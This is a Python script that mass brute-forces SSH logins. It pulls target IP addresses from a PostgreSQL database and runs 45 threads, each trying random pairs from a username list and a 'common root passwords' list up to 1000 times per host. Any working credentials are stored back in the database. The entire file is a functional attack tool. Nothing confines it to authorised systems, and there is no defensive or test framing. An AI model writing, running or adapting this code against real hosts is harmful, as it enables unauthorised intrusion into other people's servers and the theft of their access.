import psycopg2
import paramiko
import random
import threading
import os
from queue import Queue
import traceback
import time
import socket

from dotenv import load_dotenv
load_dotenv()

GREEN = '\033[32m'
RED = '\033[31m'
RESET = '\033[0m'
YELLOW = '\033[33m'

conn = psycopg2.connect(
    host=os.getenv('DB_HOST'),
    port=os.getenv('DB_PORT'),
    dbname=os.getenv('DB_NAME'),
    user=os.getenv('DB_USER'),
    password=os.getenv('DB_PASSWORD')
)

MAX_RETRIES = 3
MAX_CONNECTIONS = 45

class SSHConnectionThread(threading.Thread):
    def __init__(self, queue, username_file, password_file):
        threading.Thread.__init__(self)
        self.queue = queue
        self.usernames = self.read_file_lines(username_file)
        self.passwords = self.read_file_lines(password_file)

    def read_file_lines(self, file_path):
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as file:
            lines = file.read().splitlines()
        return lines

    def run(self):
        while True:
            # Get the IP address from the queue
            ip_address = self.queue.get()
            if ip_address is None:
                # Signal to stop the thread
                break
            try:
                for _ in range(1000):
                    username = random.choice(self.usernames)
                    password = random.choice(self.passwords)
                    retries = 0
                    while retries < MAX_RETRIES:
                        try:
                            client = paramiko.SSHClient()
                            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                            print(f"{GREEN}Trying {RESET}{username}/{password} {GREEN}as credentials on {RESET}{ip_address}")

                            try:
                                client.connect(str(ip_address), port=22, username=username, password=password, timeout=15)
                                print(f"{GREEN}Successful login on {RESET}{ip_address}{GREEN} with credentials: {RESET}{username}/{password}")
                                cur = conn.cursor()
                                cur.execute("UPDATE hosts SET ssh_login = %s WHERE ip_address = %s", (f"{username}:{password}", str(ip_address)))
                                conn.commit()
                            except paramiko.AuthenticationException:
                                # Incorrect credentials, continue to the next one
                                break
                            except paramiko.SSHException:
                                print(f"{RED}Failed to connect to {RESET}{ip_address}")
                                break
                            except socket.timeout:
                                print(f"{RED}Connection timed out for {RESET}{ip_address}")
                                break
                            except paramiko.ssh_exception.NoValidConnectionsError as e:
                                print(f"{RED}Unable to connect to port 22 on {RESET}{ip_address}")
                                print(f"{RED}Error: {RESET}{str(e)}")
                                break
                            except (ConnectionResetError, paramiko.ssh_exception.SSHException) as e:
                                print(f"{RED}Connection reset. Retrying...")
                                retries += 1
                                time.sleep(1)  # Wait for 1 second before retrying
                                continue
                            finally:
                                client.close()
                            break
                        except Exception as e:
                            print(f"{RED}Error occurred: {RESET}{str(e)}")
                            traceback.print_exc()
                            break
                    if retries >= MAX_RETRIES:
                        print(f"{YELLOW}Maximum retries reached. Moving to the next host.")
            except Exception as e:
                print(f"{RED}Error occurred while processing {ip_address}: {str(e)}")
            self.queue.task_done()


def main(username_file, password_file):
    # Fetch the IP addresses from the database
    cur = conn.cursor()
    cur.execute("SELECT ip_address FROM hosts WHERE ip_address IS NOT NULL")
    ip_addresses = [row[0] for row in cur.fetchall()]
    
    # Create a queue to hold the IP addresses
    queue = Queue()
    for ip_address in ip_addresses:
        queue.put(ip_address)

    # Create and start the threads
    threads = []
    for _ in range(MAX_CONNECTIONS):
        thread = SSHConnectionThread(queue, username_file, password_file)
        thread.start()
        threads.append(thread)

    # Wait for all the tasks to complete
    queue.join()

    # Stop the threads
    for _ in range(MAX_CONNECTIONS):
        queue.put(None)
    for thread in threads:
        thread.join()

username_file = "usernames.txt"
password_file = "common_root_passwords.txt"
main(username_file, password_file)

